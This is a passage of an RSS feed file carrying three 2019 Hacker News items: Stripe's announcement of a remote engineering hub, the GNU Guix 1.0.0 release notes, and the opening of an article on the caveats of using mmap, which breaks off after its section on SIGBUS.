<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Stripe’s fifth engineering hub is Remote</title>
<link>https://stripe.com/blog/remote-hub</link>
<guid isPermaLink="true" >https://stripe.com/blog/remote-hub</guid>
<description>&lt;p&gt;Stripe has engineering hubs in San Francisco, Seattle, Dublin, and Singapore. We are establishing a fifth hub that is less traditional but no less important: Remote. We are doing this to situate product development closer to our customers, improve our ability to tap the 99.74% of talented engineers living outside the metro areas of our first four hubs, and further our mission of increasing the GDP of the internet.&lt;/p&gt;
&lt;p&gt;Stripe will hire over a hundred remote engineers this year. They will be deployed across every major engineering workstream at Stripe.&lt;/p&gt;
&lt;h2 id=&quot;our-users-are-everywhere-we-have-to-be-too&quot;&gt;Our users are everywhere. We have to be, too.&lt;/h2&gt;
&lt;p&gt;Our remotes keep us close to our customers, which is key to building great products. They are deeply embedded in the rhythms of their cities. They see how people purchase food differently in bodegas, konbini, and darshinis. They know why it is important to engineer robustness in the face of slow, unreliable internet connections. They have worked in and run businesses that don’t have access to global payments infrastructure.&lt;/p&gt;
&lt;p&gt;Stripe has had hundreds of extremely high-impact remote employees since inception. Historically, they’ve reported into teams based in one of our hubs. We had a strong preference for managers to be located in-office and for teams to be office-centric, to maximize face-to-face bandwidth when doing creative work.&lt;/p&gt;
&lt;p&gt;As we have grown as a company, we have learned some things.&lt;/p&gt;
&lt;p&gt;One is that the technological substrate of collaboration has gotten &lt;em&gt;shockingly&lt;/em&gt; good over the last decade. Most engineering work at Stripe happens in conversations between engineers, quiet thinking, and turning those thoughts into artifacts. Of these, thinking is the only one that doesn’t primarily happen online.&lt;/p&gt;
&lt;p&gt;There was a time when writing on a whiteboard had substantially higher bandwidth than a Word doc over email. Thankfully Google Docs, Slack, git, Zoom, and the like deliver high-bandwidth synchronous collaboration on creative work. The experience of using them is so remarkably good that we only notice it when something is broken. Since you write code via pull requests and not whiteboards, your reviewer needs to have access to the same PR; having access to the same whiteboard is strictly optional.&lt;/p&gt;
&lt;p&gt;While we did not initially plan to make hiring remotes a huge part of our engineering efforts, our remote employees have outperformed all expectations. Foundational elements of the Stripe technology stack, our products, our business, and our culture were contributed by remotes. We would be a greatly diminished company without them.&lt;/p&gt;
&lt;h2 id=&quot;stripes-new-remote-engineering-hub&quot;&gt;Stripe’s new remote engineering hub&lt;/h2&gt;
&lt;p&gt;We have seen such promising results from our remote engineers that we are greatly increasing our investment in remote engineering.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;We are formalizing our Remote engineering hub.&lt;/strong&gt; It is coequal with our physical hubs, and will benefit from some of our experience in &lt;a href=&quot;https://stripe.com/atlas/guides/scaling-eng&quot;&gt;scaling engineering organizations&lt;/a&gt;. For example, there will be dedicated engineering teams in the Remote hub that exist in no other hub. (Some individuals report to a team located in a different hub, and we expect this will remain common, but the bulk of high-bandwidth coworker relationships are within-hub.) We also have a remote engineering lead, analogous to the site leads we have for our physical hubs.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;We are expanding the scope we will hire for remotely&lt;/strong&gt;. In addition to hiring engineers, we plan to begin hiring remote product managers, engineering managers, and technical program managers later this year. (We will continue hiring remote employees in non-engineering positions across the company as well.)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;We intend to expand our remote engineering hiring aggressively.&lt;/strong&gt; We will hire at least a hundred remote engineers this year. We expect to be constrained primarily by our capacity to onboard and support new remote engineers, and we will work to increase that capacity.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;We will continue to improve the experience of being a remote.&lt;/strong&gt; We have carefully tracked the experience of our remote employees, including in our twice-annual employee survey. Most recently, 73% of engineers at Stripe believe we do a good job of integrating remote employees.&lt;/p&gt;
&lt;p&gt;Great user experiences are made in the tiny details. We care about the details to a degree that is borderline obsessive. A recent example: we wrote code to attach a videoconferencing link to every calendar invitation by default, so that remotes never feel awkward having to ask for one.&lt;/p&gt;
&lt;h2 id=&quot;more-to-come&quot;&gt;More to come&lt;/h2&gt;
&lt;p&gt;There are still some constraints on our ambitions. In our first phase, we will be focused primarily on remote engineers in North America, starting with the US and Canada. While we are confident that great work is possible within close time zones, we don’t yet have structures to give remotes a reliably good experience working across large time zone differences. And though we intend to hire remote engineers in Europe and Asia eventually, our hubs in Dublin and Singapore are not sufficiently established to support remotes just yet.&lt;/p&gt;
&lt;p&gt;Most engineers working at Stripe are full-time employees, with a full benefits suite. There is substantial organizational, legal, and financial infrastructure required to support each new jurisdiction we hire in, so we have to be measured in how quickly we expand. We can support most US states today, and plan to expand our hiring capabilities to include jurisdictions covering more than 90% of the US population as quickly as possible. We intend, over the longer term, to be everywhere our customers are.&lt;/p&gt;
&lt;p&gt;We will continue encouraging governments worldwide to lower barriers to hiring. Our customers, from startups to international conglomerates, all feel the pain of this. We think making it easier for companies to hire would produce a step-function increase in global GDP.&lt;/p&gt;
&lt;h2 id=&quot;we-want-to-talk-to-you&quot;&gt;We want to talk to you&lt;/h2&gt;
&lt;p&gt;We would love to talk about our Remote hub or &lt;a href=&quot;https://stripe.com/jobs/search?l=remote&quot;&gt;remote positions at Stripe&lt;/a&gt;. Our CEO and co-founder, Patrick Collison, and I will host a remote coffee on May 22, 2019; &lt;a href=&quot;https://stripe.events/remote-coffee&quot;&gt;sign up to be invited&lt;/a&gt; to it. We are also, and always, available on the internet.&lt;/p&gt;
</description>
<pubDate>Thu, 02 May 2019 12:43:21 +0000</pubDate>
<dc:creator>geordilaforge</dc:creator>
<og:title>Stripe’s fifth engineering hub is Remote</og:title>
<og:url>https://stripe.com/blog/remote-hub</og:url>
<og:description>Stripe has engineering hubs in San Francisco, Seattle, Dublin, and Singapore. We are establishing a fifth hub that is less traditional but no less important: Remote. We are doing this to situate product development closer to our customers, improve our ability to tap the 99.74% of talented engineers living outside the metro areas of our first four hubs, and further our mission of increasing the GDP of the internet. Stripe will hire over a hundred remote engineers this year. They will be deployed across every major engineering workstream at Stripe. ## Our users are everywhere. We have to be, too. Our remotes keep us close to our customers, which is key to building great products. They are deeply embedded in the rhythms of their cities. They see how people purchase food differently in bodegas, konbini, and darshinis. They know why it is important to engineer robustness in the face of slow, unreliable internet connections. They have worked in and run businesses that don’t have access to global payments infrastructure. Stripe has had hundreds of extremely high-impact remote employees since inception. Historically, they’ve reported into teams based in one of our hubs. We had a strong preference for managers to be located in-office and for teams to be office-centric, to maximize face-to-face bandwidth when doing creative work. As we have grown as a company, we have learned some things. One is that the technological substrate of collaboration has gotten *shockingly* good over the last decade. Most engineering work at Stripe happens in conversations between engineers, quiet thinking, and turning those thoughts into artifacts. Of these, thinking is the only one that doesn’t primarily happen online. There was a time when writing on a whiteboard had substantially higher bandwidth than a Word doc over email. Thankfully Google Docs, Slack, git, Zoom, and the like deliver high-bandwidth synchronous collaboration on creative work. The experience of using them is so remarkably good that we only notice it when something is broken. Since you write code via pull requests and not whiteboards, your reviewer needs to have access to the same PR; having access to the same whiteboard is strictly optional. While we did not initially plan to make hiring remotes a huge part of our engineering efforts, our remote employees have outperformed all expectations. Foundational elements of the Stripe technology stack, our products, our business, and our culture were contributed by remotes. We would be a greatly diminished company without them. ## Stripe’s new remote engineering hub We have seen such promising results from our remote engineers that we are greatly increasing our investment in remote engineering. **We are formalizing our Remote engineering hub.** It is coequal with our physical hubs, and will benefit from some of our experience in [scaling engineering organizations](https://stripe.com/atlas/guides/scaling-eng). For example, there will be dedicated engineering teams in the Remote hub that exist in no other hub. (Some individuals report to a team located in a different hub, and we expect this will remain common, but the bulk of high-bandwidth coworker relationships are within-hub.) We also have a remote engineering lead, analogous to the site leads we have for our physical hubs. **We are expanding the scope we will hire for remotely**. In addition to hiring engineers, we plan to begin hiring remote product managers, engineering managers, and technical program managers later this year. (We will continue hiring remote employees in non-engineering positions across the company as well.) **We intend to expand our remote engineering hiring aggressively.** We will hire at least a hundred remote engineers this year. We expect to be constrained primarily by our capacity to onboard and support new remote engineers, and we will work to increase that capacity. **We will continue to improve the experience of being a remote.** We have carefully tracked the experience of our remote employees, including in our twice-annual employee survey. Most recently, 73% of engineers at Stripe believe we do a good job of integrating remote employees. Great user experiences are made in the tiny details. We care about the details to a degree that is borderline obsessive. A recent example: we wrote code to attach a videoconferencing link to every calendar invitation by default, so that remotes never feel awkward having to ask for one. ## More to come There are still some constraints on our ambitions. In our first phase, we will be focused primarily on remote engineers in North America, starting with the US and Canada. While we are confident that great work is possible within close time zones, we don’t yet have structures to give remotes a reliably good experience working across large time zone differences. And though we intend to hire remote engineers in Europe and Asia eventually, our hubs in Dublin and Singapore are not sufficiently established to support remotes just yet. Most engineers working at Stripe are full-time employees, with a full benefits suite. There is substantial organizational, legal, and financial infrastructure required to support each new jurisdiction we hire in, so we have to be measured in how quickly we expand. We can support most US states today, and plan to expand our hiring capabilities to include jurisdictions covering more than 90% of the US population as quickly as possible. We intend, over the longer term, to be everywhere our customers are. We will continue encouraging governments worldwide to lower barriers to hiring. Our customers, from startups to international conglomerates, all feel the pain of this. We think making it easier for companies to hire would produce a step-function increase in global GDP. ## We want to talk to you We would love to talk about our Remote hub or [remote positions at Stripe](https://stripe.com/jobs/search?l=remote). Our CEO and co-founder, Patrick Collison, and I will host a remote coffee on May 22, 2019; [sign up to be invited](https://stripe.events/remote-coffee) to it. We are also, and always, available on the internet.</og:description>
<og:image>https://stripe.com/img/v3/home/social.png</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://stripe.com/blog/remote-hub</dc:identifier>
</item>
<item>
<title>GNU Guix 1.0.0 released</title>
<link>https://www.gnu.org/software/guix/blog/2019/gnu-guix-1.0.0-released/</link>
<guid isPermaLink="true" >https://www.gnu.org/software/guix/blog/2019/gnu-guix-1.0.0-released/</guid>
<description>&lt;h2&gt;GNU Guix 1.0.0 released&lt;/h2&gt;&lt;p class=&quot;post-metadata centered-text&quot;&gt;Ludovic Courtès — May 2, 2019&lt;/p&gt;
&lt;p&gt;We are excited to announce the release of GNU Guix version 1.0.0!&lt;/p&gt;
&lt;p&gt;The release comes with &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/System-Installation.html&quot;&gt;ISO-9660 installation images&lt;/a&gt;, a &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Running-Guix-in-a-VM.html&quot;&gt;virtual machine image&lt;/a&gt;, and with tarballs to install the package manager on top of your GNU/Linux distro, either &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Requirements.html&quot;&gt;from source&lt;/a&gt; or &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Binary-Installation.html&quot;&gt;from binaries&lt;/a&gt;. Guix users can update by running &lt;code&gt;guix pull&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.gnu.org/software/guix/static/blog/img/guix-1.0.png&quot; alt=&quot;Guix 1.0!&quot;/&gt;&lt;/p&gt;
&lt;p&gt;One-point-oh always means a lot for free software releases. For Guix, 1.0 is the result of seven years of development, with code, packaging, and documentation contributions made by 260 people, translation work carried out by a dozen of people, and artwork and web site development by a couple of individuals, to name some of the activities that have been happening. During those years we published no less than &lt;a href=&quot;https://www.gnu.org/software/guix/blog/tags/releases/&quot;&gt;19 “0.x” releases&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;We took our time to get there, which is quite unusual in an era where free software moves so fast. Why did we take this much time? First, it takes time to build a community around a GNU/Linux distribution, and a distribution wouldn’t really exist without it. Second, we feel like we’re contributing an important piece to &lt;a href=&quot;https://www.gnu.org/gnu/about-gnu.html&quot;&gt;the GNU operating system&lt;/a&gt;, and that is surely intimidating and humbling.&lt;/p&gt;
&lt;p&gt;Last, we’ve been building something new. Of course we stand on the shoulders of giants, and in particular &lt;a href=&quot;https://nixos.org/nix/&quot;&gt;Nix&lt;/a&gt;, which brought the functional software deployment paradigm that Guix implements. But developing Guix has been—and still is!—a challenge in many ways: it’s a &lt;a href=&quot;https://arxiv.org/abs/1305.4584&quot;&gt;programming&lt;/a&gt; &lt;a href=&quot;https://www.gnu.org/software/guix/blog/2017/back-from-gpce/&quot;&gt;language&lt;/a&gt; design challenge, an &lt;a href=&quot;https://www.gnu.org/software/guix/blog/2015/service-composition-in-guixsd/&quot;&gt;operating&lt;/a&gt; &lt;a href=&quot;https://www.gnu.org/software/guix/blog/2017/running-system-services-in-containers/&quot;&gt;system&lt;/a&gt; design challenge, a challenge for &lt;a href=&quot;https://www.gnu.org/software/guix/blog/2016/timely-delivery-of-security-updates/&quot;&gt;security&lt;/a&gt;, &lt;a href=&quot;https://www.gnu.org/software/guix/blog/tags/reproducibility/&quot;&gt;reproducibility&lt;/a&gt;, &lt;a href=&quot;https://www.gnu.org/software/guix/blog/tags/bootstrapping/&quot;&gt;bootstrapping&lt;/a&gt;, usability, and more. In other words, it’s been a long but insightful journey! :-)&lt;/p&gt;

&lt;p&gt;Presumably some of the readers are discovering Guix today, so let’s recap what Guix can do for you as a user. Guix is a complete toolbox for software deployment in general, which makes it different from most of the tools you may be familiar with.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.gnu.org/software/guix/static/blog/img/guix-scope.png&quot; alt=&quot;Guix manages packages, environments, containers, and systems.&quot;/&gt;&lt;/p&gt;
&lt;p&gt;This may sound a little abstract so let’s look at concrete use cases:&lt;/p&gt;
&lt;ul readability=&quot;31.101871101871&quot;&gt;&lt;li readability=&quot;22.128440366972&quot;&gt;
&lt;p&gt;&lt;em&gt;As a user&lt;/em&gt;, Guix allows you to &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Invoking-guix-package.html&quot;&gt;install applications and to keep them up-to-date&lt;/a&gt;: search for software with &lt;code&gt;guix search&lt;/code&gt;, install it with &lt;code&gt;guix install&lt;/code&gt;, and maintain it up-to-date by regularly running &lt;code&gt;guix pull&lt;/code&gt; and &lt;code&gt;guix upgrade&lt;/code&gt;. Guix follows a so-called “rolling release” model, so you can run &lt;code&gt;guix pull&lt;/code&gt; at any time to get the latest and greatest bits of free software.&lt;/p&gt;
&lt;p&gt;This certainly sounds familiar, but a distinguishing property here is &lt;em&gt;dependability&lt;/em&gt;: Guix is transactional, meaning that you can at any time roll back to a previous “generation” of your package set with &lt;code&gt;guix package --roll-back&lt;/code&gt;, inspect differences with &lt;code&gt;guix package -l&lt;/code&gt;, and so on.&lt;/p&gt;
&lt;p&gt;Another useful property is &lt;em&gt;reproducibility&lt;/em&gt;: Guix allows you to deploy the &lt;em&gt;exact same software environment&lt;/em&gt; on different machines or at different points in time thanks to &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Invoking-guix-describe.html&quot;&gt;&lt;code&gt;guix describe&lt;/code&gt;&lt;/a&gt; and &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Invoking-guix-pull.html&quot;&gt;&lt;code&gt;guix pull&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This, coupled with the fact that package management operations do not require root access, is invaluable notably in the context of high-performance computing (HPC) and reproducible science, which the &lt;a href=&quot;https://guix-hpc.bordeaux.inria.fr/&quot;&gt;Guix-HPC effort&lt;/a&gt; has been focusing on.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;12.277539341917&quot;&gt;
&lt;p&gt;&lt;em&gt;As a developer&lt;/em&gt;, we hope you’ll enjoy &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Invoking-guix-environment.html&quot;&gt;&lt;code&gt;guix environment&lt;/code&gt;&lt;/a&gt;, which allows you to spawn one-off software environments. Suppose you’re a GIMP developer: running &lt;code&gt;guix environment gimp&lt;/code&gt; spawns a shell with everything you need to hack on GIMP—much quicker than manually installing its many dependencies.&lt;/p&gt;
&lt;p&gt;Developers often struggle to push their work to users so they get quick feedback. The &lt;a href=&quot;https://www.gnu.org/software/guix/blog/2017/creating-bundles-with-guix-pack/&quot;&gt;&lt;code&gt;guix pack&lt;/code&gt;&lt;/a&gt; provides an easy way to create &lt;em&gt;container images&lt;/em&gt; for use by Docker &amp;amp; co., or even &lt;a href=&quot;https://www.gnu.org/software/guix/blog/2018/tarballs-the-ultimate-container-image-format/&quot;&gt;standalone relocatable tarballs&lt;/a&gt; that anyone can run, regardless of the GNU/Linux distribution they use.&lt;/p&gt;
&lt;p&gt;Oh, and you may also like &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Package-Transformation-Options.html&quot;&gt;package transformation options&lt;/a&gt;, which allow you define package variants from the command line.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;25.150684931507&quot;&gt;
&lt;p&gt;&lt;em&gt;As a system administrator&lt;/em&gt;—and actually, we’re all system administrators of sorts on our laptops!—, Guix’s declarative and unified approach to configuration management should be handy. It surely is a departure from what most people are used to, but it is so reassuring: one configuration file is enough to specify &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Using-the-Configuration-System.html&quot;&gt;all the aspects of the system config&lt;/a&gt;—services, file systems, locale, accounts—all in the same language.&lt;/p&gt;
&lt;p&gt;That makes it surprisingly easy to deploy otherwise complex services such as applications that depend on Web services. For instance, setting up &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Version-Control-Services.html#Cgit-Service&quot;&gt;CGit&lt;/a&gt; or &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Monitoring-Services.html#Zabbix-front_002dend&quot;&gt;Zabbix&lt;/a&gt; is a one-liner, even though behind the scenes that involves setting up nginx, fcgiwrap, etc. We’d love to see to what extent this helps people self-host services—sort of similar to what &lt;a href=&quot;https://freedombox.org/&quot;&gt;FreedomBox&lt;/a&gt; and &lt;a href=&quot;https://yunohost.org/&quot;&gt;YunoHost&lt;/a&gt; have been focusing on.&lt;/p&gt;
&lt;p&gt;With &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Invoking-guix-system.html&quot;&gt;&lt;code&gt;guix system&lt;/code&gt;&lt;/a&gt; you can instantiate a configuration on your machine, or in a virtual machine (VM) where you can test it, or in a container. You can also provision ISO images, VM images, or container images with a complete OS, from the same config, all with &lt;code&gt;guix system&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The &lt;a href=&quot;https://www.gnu.org/software/guix/guix-refcard.pdf&quot;&gt;quick reference card&lt;/a&gt; shows the important commands. As you start diving deeper into Guix, you’ll discover that many aspects of the system are exposed using consistent &lt;a href=&quot;https://www.gnu.org/software/guile/&quot;&gt;Guile&lt;/a&gt; programming interfaces: &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Defining-Packages.html&quot;&gt;package definitions&lt;/a&gt;, &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Services.html&quot;&gt;system services&lt;/a&gt;, the &lt;a href=&quot;https://www.gnu.org/software/shepherd/&quot;&gt;“init” system&lt;/a&gt;, and a whole bunch of system-level libraries. We believe that makes the system very &lt;em&gt;hackable&lt;/em&gt;, and we hope you’ll find it as much fun to play with as we do.&lt;/p&gt;
&lt;p&gt;So much for the overview!&lt;/p&gt;

&lt;p&gt;For those who’ve been following along, a great many things have changed over the last 5 months since the &lt;a href=&quot;https://www.gnu.org/software/guix/blog/2018/gnu-guix-and-guixsd-0.16.0-released/&quot;&gt;0.16.0 release&lt;/a&gt;—99 people contributed over 5,700 commits during that time! Here are the highlights:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;The ISO installation image now runs a cute &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Guided-Graphical-Installation.html&quot;&gt;text-mode graphical installer&lt;/a&gt;—big thanks to Mathieu Othacehe for writing it and to everyone who tested it and improved it! It is similar in spirit to the Debian installer. Whether you’re a die-hard GNU/Linux hacker or a novice user, you’ll certainly find that this makes system installation much less tedious than it was! The installer is fully translated to French, German, and Spanish.&lt;/li&gt;
&lt;li&gt;The new &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Running-GuixSD-in-a-VM.html&quot;&gt;VM image&lt;/a&gt; better matches user expectations: whether you want to tinker with Guix System and see what it’s like, or whether you want to use it as a development environment, this VM image should be more directly useful.&lt;/li&gt;
&lt;li&gt;The user interface was improved: aliases for common operations &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Invoking-guix-package.html&quot;&gt;such as &lt;code&gt;guix search&lt;/code&gt; and &lt;code&gt;guix install&lt;/code&gt;&lt;/a&gt; are now available, diagnostics are now colorized, more operations show a progress bar, there’s a new &lt;code&gt;--verbosity&lt;/code&gt; option recognized by all commands, and most commands are now “quiet” by default.&lt;/li&gt;
&lt;li&gt;There’s a new &lt;code&gt;--with-git-url&lt;/code&gt; &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Package-Transformation-Options.html&quot;&gt;package transformation option&lt;/a&gt;, that goes with &lt;code&gt;--with-branch&lt;/code&gt; and &lt;code&gt;--with-commit&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Guix now has a first-class, uniform mechanism to configure &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/Keyboard-Layout.html&quot;&gt;keyboard layout&lt;/a&gt;—a long overdue addition. Related to that, &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/X-Window.html&quot;&gt;Xorg configuration&lt;/a&gt; has been streamlined with the new &lt;code&gt;xorg-configuration&lt;/code&gt; record.&lt;/li&gt;
&lt;li&gt;We introduced &lt;code&gt;guix pack -R&lt;/code&gt; &lt;a href=&quot;https://www.gnu.org/software/guix/blog/2018/tarballs-the-ultimate-container-image-format/&quot;&gt;a while back&lt;/a&gt;: it creates tarballs containing &lt;em&gt;relocatable&lt;/em&gt; application bundles that rely on user namespaces. Starting from 1.0, &lt;code&gt;guix pack -RR&lt;/code&gt; (like “reliably relocatable”?) generates relocatable binaries that fall back to &lt;a href=&quot;https://proot-me.github.io/&quot;&gt;PRoot&lt;/a&gt; on systems where &lt;a href=&quot;http://man7.org/linux/man-pages/man7/user_namespaces.7.html&quot;&gt;user namespaces&lt;/a&gt; are not supported.&lt;/li&gt;
&lt;li&gt;More than 1,100 packages were added, leading to &lt;a href=&quot;https://www.gnu.org/software/guix/packages&quot;&gt;close to 10,000 packages&lt;/a&gt;, 2,104 packages were updated, and several system services were contributed.&lt;/li&gt;
&lt;li&gt;The manual has been fully translated to &lt;a href=&quot;https://www.gnu.org/software/guix/manual/fr/html_node/&quot;&gt;French&lt;/a&gt;, the &lt;a href=&quot;https://www.gnu.org/software/guix/manual/de/html_node/&quot;&gt;German&lt;/a&gt; and &lt;a href=&quot;https://www.gnu.org/software/guix/manual/es/html_node/&quot;&gt;Spanish&lt;/a&gt; translations are nearing completion, and work has begun on a &lt;a href=&quot;https://www.gnu.org/software/guix/manual/zh-cn/html_node/&quot;&gt;Simplified Chinese&lt;/a&gt; translation. You can help &lt;a href=&quot;https://translationproject.org/domain/guix-manual.html&quot;&gt;translate the manual into your language&lt;/a&gt; by &lt;a href=&quot;https://translationproject.org/html/translators.html&quot;&gt;joining the Translation Project&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;That’s a long list already, but you can find more details in the &lt;a href=&quot;https://git.savannah.gnu.org/cgit/guix.git/tree/NEWS?h=version-1.0.0&quot;&gt;&lt;code&gt;NEWS&lt;/code&gt;&lt;/a&gt; file.&lt;/p&gt;

&lt;p&gt;One-point-oh is a major milestone, especially for those of us who’ve been on board for several years. But with the wealth of ideas we’ve been collecting, it’s definitely not the end of the road!&lt;/p&gt;
&lt;p&gt;If you’re interested in “devops” and distributed deployment, you will certainly be happy to help in that area, those interested in OS development might want to make &lt;a href=&quot;https://www.gnu.org/software/shepherd/&quot;&gt;the Shepherd&lt;/a&gt; more flexible and snappy, furthering integration with &lt;a href=&quot;https://www.gnu.org/software/guix/blog/2019/connecting-reproducible-deployment-to-a-long-term-source-code-archive/&quot;&gt;Software Heritage&lt;/a&gt; will probably be #1 on the to-do list of scientists concerned with long-term reproducibility, programming language tinkerers may want to push &lt;a href=&quot;https://www.gnu.org/software/guix/manual/en/html_node/G_002dExpressions.html#G_002dExpressions&quot;&gt;G-expressions&lt;/a&gt; further, etc. Guix 1.0 is a tool that’s both serviceable for one’s day-to-day computer usage and a great playground for the tinkerers among us.&lt;/p&gt;
&lt;p&gt;Whether you want to help on design, coding, maintenance, system administration, translation, testing, artwork, web services, funding, organizing a Guix install party… &lt;a href=&quot;https://www.gnu.org/software/guix/contribute/&quot;&gt;your contributions are welcome&lt;/a&gt;!&lt;/p&gt;
&lt;p&gt;We’re humans—don’t hesitate to &lt;a href=&quot;https://www.gnu.org/software/guix/contact/&quot;&gt;get in touch with us&lt;/a&gt;, and enjoy Guix 1.0!&lt;/p&gt;
&lt;h4&gt;About GNU Guix&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://www.gnu.org/software/guix&quot;&gt;GNU Guix&lt;/a&gt; is a transactional package manager and an advanced distribution of the GNU system that &lt;a href=&quot;https://www.gnu.org/distros/free-system-distribution-guidelines.html&quot;&gt;respects user freedom&lt;/a&gt;. Guix can be used on top of any system running the kernel Linux, or it can be used as a standalone operating system distribution for i686, x86_64, ARMv7, and AArch64 machines.&lt;/p&gt;
&lt;p&gt;In addition to standard package management features, Guix supports transactional upgrades and roll-backs, unprivileged package management, per-user profiles, and garbage collection. When used as a standalone GNU/Linux distribution, Guix offers a declarative, stateless approach to operating system configuration management. Guix is highly customizable and hackable through &lt;a href=&quot;https://www.gnu.org/software/guile&quot;&gt;Guile&lt;/a&gt; programming interfaces and extensions to the &lt;a href=&quot;http://schemers.org&quot;&gt;Scheme&lt;/a&gt; language.&lt;/p&gt;

</description>
<pubDate>Thu, 02 May 2019 12:20:18 +0000</pubDate>
<dc:creator>brendyn</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.gnu.org/software/guix/blog/2019/gnu-guix-1.0.0-released/</dc:identifier>
</item>
<item>
<title>Use Mmap with Care</title>
<link>https://www.sublimetext.com/blog/articles/use-mmap-with-care</link>
<guid isPermaLink="true" >https://www.sublimetext.com/blog/articles/use-mmap-with-care</guid>
<description>&lt;p&gt;When we implemented the git portion of &lt;a href=&quot;https://sublimemerge.com&quot;&gt;Sublime Merge&lt;/a&gt;, we chose to use &lt;code&gt;mmap&lt;/code&gt; for reading git object files. This turned out to be considerably more difficult than we had first thought. Using &lt;code&gt;mmap&lt;/code&gt; in desktop applications has some serious caveats, and here's why:&lt;/p&gt;&lt;p&gt;&lt;em&gt;You can follow along with &lt;a href=&quot;https://github.com/sublimehq/mmap-example&quot; target=&quot;_blank&quot;&gt;the example project here.&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Say you were reading some binary format, data you need throughout some application. You take the easiest approach and use a simple &lt;code&gt;read&lt;/code&gt; to get the full contents of the file. You release your software and someone comes along and says: &quot;I need to parse this 3GB file, but I only have 2GB of memory. Could you make it so that you're not using so much memory?&quot;. Of course you want to help them, so you do some searching and come to the conclusion that memory mapping is the perfect solution to this problem.&lt;/p&gt;
&lt;p&gt;Memory mapped files work by mapping the full file into a virtual address space and then using page faults to determine which chunks to load into physical memory. In essence it allows you to access the file as if you had read the whole thing into memory, without actually doing so. Crucially it requires only a small change to the codebase:&lt;/p&gt;
&lt;img src=&quot;https://www.sublimetext.com/screenshots/use_mmap_with_care/1.png&quot;/&gt;&lt;p&gt;And with that, you've fixed the memory usage issue. You've fixed the bug, people are happy and all is well until you get another support ticket. Your program is crashing with a SIGBUS.&lt;/p&gt;
&lt;h2&gt;Caveat 1: SIGBUS&lt;/h2&gt;
&lt;p&gt;SIGBUS (bus error) is a signal that happens when you try to access memory that has not been physically mapped. This is different to a SIGSEGV (segmentation fault) in that a segfault happens when an address is invalid, while a bus error means the address is valid but we failed to read/write.&lt;/p&gt;
&lt;p&gt;As it turns out, the ticket comes from someone using a networked drive. Their network happened to disconnect while your memory mapped file was open, and since the file no longer existed the OS couldn't load it into ram for you and gave you a SIGBUS instead.&lt;/p&gt;
&lt;p&gt;Because the OS is loading the file on demand, you now have this wonderful issue where any arbitrary read from an address into the memory mapped file can and &lt;em&gt;will&lt;/em&gt; fail at some point.&lt;/p&gt;
&lt;p&gt;Luckily on POSIX systems we have signal handlers, and SIGBUS is a signal we can handle. All you need to do is register a signal handler for SIGBUS when the program starts and jump back to our code to handle failures there.&lt;/p&gt;
